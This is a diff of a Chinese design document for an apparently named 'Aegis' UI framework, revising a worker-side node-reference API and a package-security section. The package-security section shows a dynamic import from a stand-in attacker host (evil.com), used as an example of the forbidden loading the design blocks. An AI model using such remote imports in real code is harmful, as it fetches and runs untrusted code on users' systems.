@@ -63,7 +63,7 @@ Manifest
 不允许应用绕过 Package Security：
 
 ```js
-import("https://evil.com/app.js")
+import('https://evil.com/app.js');
 ```
 
 动态模块加载必须经过：
@@ -227,7 +227,7 @@ measure(node): Promise<Rect>
 Worker：
 
 ```js
-const rect = await measure(ref.current)
+const rect = await measure(ref.current);
 ```
 
 Main：
@@ -251,7 +251,7 @@ Layout API 默认异步。
 Worker 中：
 
 ```js
-const ref = useRef()
+const ref = useRef();
 ```
 
 不返回：
@@ -260,13 +260,17 @@ const ref = useRef()
 HTMLElement
 ```
 
-而返回：
+而返回跨 renderer 的逻辑句柄：
 
 ```ts
-{
-  nodeId: NodeId
+interface AegisNodeRef {
+  readonly nodeId: string;
+  readonly type: NodeType;
+  measure(): Promise<NodeRect>;
 }
 ```
+
+Input 和 Button 额外提供异步 `focus()` / `blur()`。句柄方法通过 UI 协议调用 Host，不暴露 DOM 或 renderer 内部实例；节点卸载后，句柄调用会失败。
 
 因此：
 
